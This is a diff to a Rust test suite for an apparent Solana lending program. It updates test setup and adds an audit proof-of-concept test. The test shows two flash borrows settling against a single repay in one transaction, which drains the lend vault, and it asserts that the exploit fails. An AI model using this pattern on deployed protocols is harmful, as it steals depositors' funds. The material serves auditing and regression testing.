@@ -1,7 +1,7 @@
 mod common;
 use common::{
     create_mint_ixs, create_token_account_ixs, mint_to_ix, read_token_balance, send_ixs,
-    try_send_ixs,
+    set_mint_authority_ix, try_send_ixs,
 };
 
 use anchor_lang::prelude::Pubkey;
@@ -89,6 +89,11 @@ fn setup(seed_lend_amount: u64) -> Setup {
         .unwrap();
     svm.add_program(irm_id, include_bytes!("../../../target/deploy/irm.so"))
         .unwrap();
+    svm.add_program(
+        faucet::id(),
+        include_bytes!("../../../target/deploy/faucet.so"),
+    )
+    .unwrap();
     svm.airdrop(&payer.pubkey(), 100_000_000_000).unwrap();
     svm.airdrop(&authority.pubkey(), 10_000_000_000).unwrap();
 
@@ -197,7 +202,9 @@ fn setup(seed_lend_amount: u64) -> Setup {
         irm::accounts::Initialize {
             irm_config,
             pool: pool_pubkey,
-            authority: payer.pubkey(),
+            // Must match the pool authority — `calma::create` requires the market's
+            // own authority to control its rate curve.
+            authority: authority.pubkey(),
             payer: payer.pubkey(),
             system_program: anchor_lang::solana_program::system_program::id(),
         }
@@ -207,14 +214,14 @@ fn setup(seed_lend_amount: u64) -> Setup {
         &mut svm,
         &[alloc_pool_ix, irm_init_ix],
         &payer,
-        &[&payer, &pool_kp],
+        &[&payer, &pool_kp, &authority],
     );
 
     let create_ix = Instruction::new_with_bytes(
         program_id,
         &calma::instruction::Create {
             ltv_percent: 75,
-            max_feed_age_secs: 90u32,
+            max_feed_age_ms: 90_000u32,
         }
         .data(),
         calma::accounts::Create {
@@ -239,7 +246,7 @@ fn setup(seed_lend_amount: u64) -> Setup {
         .to_account_metas(None),
     );
 
-    send_ixs(&mut svm, &[create_ix], &payer, &[&payer, &authority]);
+    send_ixs(&mut svm, &[create_ix], &payer, &[&payer, &authority, &pool_kp]);
 
     // ── Seed lend vault directly + patch pool state ───────────────────────────
     if seed_lend_amount > 0 {
@@ -458,6 +465,20 @@ fn test_flash_loan_leveraged_swap() {
         &[&s.payer],
     );
 
+    // mock_swap mints under the faucet's PDA, so both mints must be faucet-owned.
+    // Funding above is already done — the payer cannot mint after this point.
+    let (faucet_mint_authority, _) =
+        Pubkey::find_program_address(&[b"mint_authority"], &faucet::id());
+    send_ixs(
+        &mut s.svm,
+        &[
+            set_mint_authority_ix(&s.collateral_mint, &payer_pk, &faucet_mint_authority),
+            set_mint_authority_ix(&s.lend_mint, &payer_pk, &faucet_mint_authority),
+        ],
+        &s.payer,
+        &[&s.payer],
+    );
+
     // ── Initial collateral deposit (separate transaction) ─────────────────────
     let (user_position_pda, _) = find_user_position_pda(&s.pool_pubkey, &payer_pk, &program_id);
     let deposit_initial_ix = Instruction::new_with_bytes(
@@ -467,6 +488,8 @@ fn test_flash_loan_leveraged_swap() {
         }
         .data(),
         calma::accounts::DepositCollateral {
+            guard_program: None,
+            guard_state: None,
             pool: s.pool_pubkey,
             collateral_mint: s.collateral_mint,
             authority: payer_pk,
@@ -495,10 +518,10 @@ fn test_flash_loan_leveraged_swap() {
     let borrow_ix = flash_borrow_ix(&s, BORROW);
 
     let swap_ix = Instruction::new_with_bytes(
-        program_id,
-        &calma::instruction::MockSwap { amount: BORROW }.data(),
-        calma::accounts::MockSwap {
-            mint_authority: payer_pk,
+        faucet::id(),
+        &faucet::instruction::MockSwap { amount: BORROW }.data(),
+        faucet::accounts::MockSwap {
+            mint_authority: faucet_mint_authority,
             token_owner: payer_pk,
             mint_in: s.lend_mint,
             mint_out: s.collateral_mint,
@@ -513,6 +536,8 @@ fn test_flash_loan_leveraged_swap() {
         program_id,
         &calma::instruction::DepositCollateral { amount: BORROW }.data(),
         calma::accounts::DepositCollateral {
+            guard_program: None,
+            guard_state: None,
             pool: s.pool_pubkey,
             collateral_mint: s.collateral_mint,
             authority: payer_pk,
@@ -532,5 +557,53 @@ fn test_flash_loan_leveraged_swap() {
         &[borrow_ix, swap_ix, deposit_leveraged_ix, repay_ix],
         &s.payer,
         &[&s.payer],
+    );
+}
+
+// ── AUDIT PoC ────────────────────────────────────────────────────────────────
+//
+// Demonstrates that flash_borrow / flash_repay are not paired one-to-one.
+// `flash_borrow` only scans forward for *some* later flash_repay whose amount
+// covers its own principal+fee, and `flash_repay` only scans backward for the
+// *first* preceding flash_borrow. Neither marks the counterpart as consumed, so
+// N flash_borrows can all point at a single flash_repay.
+//
+// Result: the attacker walks away with (N-1) x principal from the lend vault.
+#[test]
+fn poc_two_flash_borrows_share_one_repay_drains_vault() {
+    const SEED: u64 = 1_000_000;
+    const BORROW: u64 = 400_000;
+    const FEE: u64 = BORROW * 9 / 10_000; // = 360
+    const REPAY: u64 = BORROW + FEE;
+
+    let mut s = setup(SEED);
+
+    // Attacker only needs the fee for ONE loan as working capital.
+    let fund_ix = mint_to_ix(&s.lend_mint, &s.user_lend_account, &s.payer.pubkey(), FEE);
+    send_ixs(&mut s.svm, &[fund_ix], &s.payer, &[&s.payer]);
+
+    let before = read_token_balance(&s.svm, &s.user_lend_account);
+
+    // Two borrows, ONE repay — all in a single transaction.
+    let borrow_a = flash_borrow_ix(&s, BORROW);
+    let borrow_b = flash_borrow_ix(&s, BORROW);
+    let repay = flash_repay_ix(&s, REPAY);
+
+    let ok = try_send_ixs(
+        &mut s.svm,
+        &[borrow_a, borrow_b, repay],
+        &s.payer,
+        &[&s.payer],
+    );
+
+    let after = read_token_balance(&s.svm, &s.user_lend_account);
+    let vault = read_token_balance(&s.svm, &s.lend_vault_pda);
+    println!("tx_succeeded={ok} attacker_before={before} attacker_after={after} vault={vault}");
+
+    assert!(
+        !ok,
+        "VULNERABLE: two flash_borrows settled against a single flash_repay. \
+         Attacker balance {before} -> {after} (profit {}), lend_vault {SEED} -> {vault}",
+        after.saturating_sub(before)
     );
 }
